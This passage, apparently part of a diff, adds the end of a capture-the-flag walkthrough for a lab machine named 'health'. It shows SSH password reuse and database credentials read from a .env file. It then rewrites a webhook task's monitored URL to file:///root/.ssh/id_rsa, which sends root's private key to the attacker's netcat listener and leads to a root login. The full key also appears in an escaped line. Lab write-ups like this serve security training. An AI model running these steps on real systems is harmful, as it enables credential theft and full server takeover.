@@ -308,3 +308,124 @@ Candidates.#1....: fullysick -> citadel
 Started: Sat Sep 17 22:31:27 2022
 Stopped: Sat Sep 17 22:32:03 2022
 ```
+
+that password is also valid as an ssh password for susanne  
+```bash
+susanne@health:~$ wc -c user.txt
+33 user.txt
+```
+```bash
+grep DB_ /var/www/html/.env
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=laravel
+DB_USERNAME=laravel
+DB_PASSWORD=MYsql_strongestpass@2014+
+```
+```bash
+mysql -D laravel -u laravel -p
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| laravel            |
++--------------------+
+2 rows in set (0.00 sec)
+
+mysql> use laravel;
+Database changed
+mysql> show tables;
++------------------------+
+| Tables_in_laravel      |
++------------------------+
+| failed_jobs            |
+| migrations             |
+| password_resets        |
+| personal_access_tokens |
+| tasks                  |
+| users                  |
++------------------------+
+6 rows in set (0.00 sec)
+
+mysql> select * from users;
+Empty set (0.00 sec)
+```
+there's no users here because that's the database for our health app  
+but, if we create a webhook through the webapp we can see the tasks beeing created in the DB  
+```bash
+
+mysql> select * from tasks;
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+| id                                   | webhookUrl               | onlyError | monitoredUrl             | frequency   | created_at          | updated_at          |
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+| 509cefcd-8058-4f41-b3d7-a8200e6c181d | http://10.10.14.166:9000 |         0 | http://10.10.14.166:8000 | */1 * * * * | 2022-09-17 21:51:24 | 2022-09-17 21:51:24 |
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+1 row in set (0.00 sec)
+```
+so if we're quick enough we can update those tasks and instead of monitoring a validated url  
+we can set watever we want here without any restrictions, so we can just dump the id_rsa for root  
+```bash
+ql> select * from tasks;
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+| id                                   | webhookUrl               | onlyError | monitoredUrl             | frequency   | created_at          | updated_at          |
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+| 447cb497-ac06-43fe-a059-8380b9084668 | http://10.10.14.166:9000 |         0 | http://10.10.14.166:8000 | */1 * * * * | 2022-09-17 22:01:24 | 2022-09-17 22:01:24 |
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+1 row in set (0.00 sec)
+
+mysql> update tasks set monitoredUrl='file:///root/.ssh/id_rsa';
+Query OK, 1 row affected (0.00 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+mysql> select * from tasks;
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+| id                                   | webhookUrl               | onlyError | monitoredUrl             | frequency   | created_at          | updated_at          |
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+| 447cb497-ac06-43fe-a059-8380b9084668 | http://10.10.14.166:9000 |         0 | file:///root/.ssh/id_rsa | */1 * * * * | 2022-09-17 22:01:24 | 2022-09-17 22:01:24 |
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+1 row in set (0.00 sec)
+```
+and we get that back in our netcat listenet on 9000
+```bash
+python3 -c 'print("-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n")'|tr -d '\'
+tr: warning: an unescaped backslash at end of string is not portable
+-----BEGIN RSA PRIVATE KEY-----
+*****************************************
+*****************************************
+*****************************************
+*****************************************
+*****************************************
+-----END RSA PRIVATE KEY-----
+```
+```bash
+ssh root@health.htb -i root.pem
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Sep 17 22:07:45 UTC 2022
+
+  System load:  0.05              Processes:           184
+  Usage of /:   69.3% of 3.84GB   Users logged in:     2
+  Memory usage: 20%               IP address for eth0: 10.10.11.176
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Sep 17 19:49:24 2022 from 10.10.14.166
+root@health:~# pwd
+/root
+root@health:~# wc -c root.txt
+33 root.txt
+```
+
+
+
